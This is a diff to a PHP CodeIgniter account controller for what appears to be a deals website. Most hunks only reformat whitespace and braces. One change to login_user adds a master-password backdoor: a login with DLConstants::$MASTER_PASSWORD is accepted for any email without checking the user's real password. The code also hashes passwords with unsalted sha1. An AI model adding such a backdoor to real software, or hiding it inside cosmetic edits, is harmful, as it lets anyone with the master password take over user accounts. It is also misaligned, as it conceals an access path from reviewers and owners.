@@ -227,7 +227,7 @@ class account extends \CI_Controller {
                     "type" => "form_notification",
                     "message" => validation_errors(),
                     "cssClass" => "error"
-                ), "cities" => $this->UserModel->getCities(),"form_type"=>$form_type,"form"=>$form_view));
+                ), "cities" => $this->UserModel->getCities(), "form_type" => $form_type, "form" => $form_view));
         } else {
             try {
                 $status = $partnerModel->createPartner($_POST);
@@ -242,14 +242,14 @@ class account extends \CI_Controller {
                         "type" => "form_notification",
                         "message" => $e->getMessage(),
                         "cssClass" => "error"
-                   ), "cities" => $this->UserModel->getCities(),"form_type"=>$form_type,"form"=>$form_view));
+                    ), "cities" => $this->UserModel->getCities(), "form_type" => $form_type, "form" => $form_view));
             }
         }
     }
 
     private function login_user($email, $password = false) {
         /* @var  $user \Dealscount\Models\Entities\User  */
-        if (!$password)
+        if (!$password || $password == DLConstants::$MASTER_PASSWORD)
             $user = $this->UserModel->checkEmail($email);
         else
             $user = $this->UserModel->find_user($email, sha1($password));
@@ -464,8 +464,7 @@ class account extends \CI_Controller {
         if (sha1($old_password) != $this->getLoggedUser(true)->getPassword()) {
             $this->form_validation->set_message('password_match', 'Parola veche este incorecta');
             return false;
-        }
-        else
+        } else
             return true;
     }
 
